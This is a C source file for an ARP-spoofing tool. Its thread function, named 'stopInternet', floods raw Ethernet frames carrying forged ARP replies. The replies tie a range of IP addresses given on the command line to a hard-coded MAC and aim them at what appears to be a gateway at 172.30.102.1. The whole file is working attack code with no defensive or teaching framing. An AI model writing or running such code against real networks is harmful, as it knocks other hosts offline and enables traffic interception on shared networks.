#include <sys/socket.h>
#include <sys/ioctl.h>
#include<unistd.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/in.h>       // IPPROTO_RAW, INET_ADDRSTRLEN
#include <netinet/ip.h>       // IP_MAXPACKET (which is 65535)
#include <net/if.h>
#include<pthread.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
struct sockaddr_ll device;

int sfd;
int thno=0;
void *stopInternet(void *args)
{
	dprintf(1,"Thread Number = %d\n",thno++);
	char *buf=(char*)args;
	int mythreadNumber =thno-1;
	int bytes;
	while(1){
	dprintf(1,"Mythread Numebr =%d \n ",mythreadNumber);
	if ((bytes = sendto (sfd, buf,42, 0, (struct sockaddr *) &device, sizeof (device))) <= 0) {
			perror ("sendto() failed");
			exit (EXIT_FAILURE);
		  }
		}	
}
struct arphdr
{
  uint16_t htype;
  uint16_t ptype;
  uint8_t hlen;
  uint8_t plen;
  uint16_t opcode;
  uint8_t sender_mac[6];
  uint8_t sender_ip[4];
  uint8_t target_mac[6];
  uint8_t target_ip[4];
};

int main(int argc,char* argv[])
{
	sfd = socket(PF_PACKET,SOCK_RAW,htons(ETH_P_ALL));
	char  interface[40];
	char* buf = (char*)malloc(1500);
	strcpy (interface, "enp7s0");
	if(sfd==-1)
	{
		perror("socket");
	}

	uint8_t src[6],dst[6];

	src[0] = 116;
	src[1] = 230;
	src[2] = 226;
	src[3] = 74;
	src[4] = 255;
	src[5] = 59;
	
	dst[0] = 00;
	dst[1] = 37;
	dst[2] = 131;
	dst[3] = 112;
	dst[4] = 16;
	dst[5] = 00;
	
	memcpy(buf,dst,6*(sizeof (uint8_t)));
	memcpy(buf+6*(sizeof (uint8_t)),src,6*(sizeof (uint8_t)));
	
	buf[12] = ETH_P_ARP / 256;
	buf[13] = ETH_P_ARP % 256;
	
	struct arphdr* arp = (struct arphdr*)(buf+14);
	arp->htype = htons(1);
	
	arp->ptype = 8;
	arp->hlen = 6;
	arp->plen = 4;
	arp->opcode = htons(2);
	
	int noofIp=100;
	
	memcpy(arp->sender_mac ,src,6*(sizeof(uint8_t)));
	memcpy(arp->target_mac ,dst,6*(sizeof(uint8_t)));
	
	 memset (&device, 0, sizeof (device));
	  if ((device.sll_ifindex = if_nametoindex (interface)) == 0) {
		perror ("if_nametoindex() failed to obtain interface index ");
		exit (EXIT_FAILURE);
	  }
	  printf ("Index for interface %s is %i\n", interface, device.sll_ifindex);
	device.sll_family = AF_PACKET;
 	memcpy (device.sll_addr, dst, 6 * sizeof (uint8_t));
	device.sll_halen = 6;
		
		
	int tempip=atoi(argv[4]);;
	while(1)
	{
		if(noofIp==0)
			continue;
		noofIp--;
		arp->sender_ip[0] = atoi(argv[1]);
		arp->sender_ip[1] = atoi(argv[2]);
		arp->sender_ip[2] = atoi(argv[3]);
		arp->sender_ip[3] = tempip++;
		if(tempip==159)
		continue;
	
		arp->target_ip[0] = 172;
		arp->target_ip[1] = 30;
		arp->target_ip[2] = 102;
		arp->target_ip[3] = 1;
	
		memcpy(buf+14,arp,28);
	

		pthread_t tid;
		char* buf1=(char*)malloc(1500);
		memcpy(buf1,buf,strlen(buf)+1);
		pthread_create(&tid,NULL,stopInternet,(void*)buf1);
	//	pthread_join(tid,NULL);			
		
	}
	
	
}
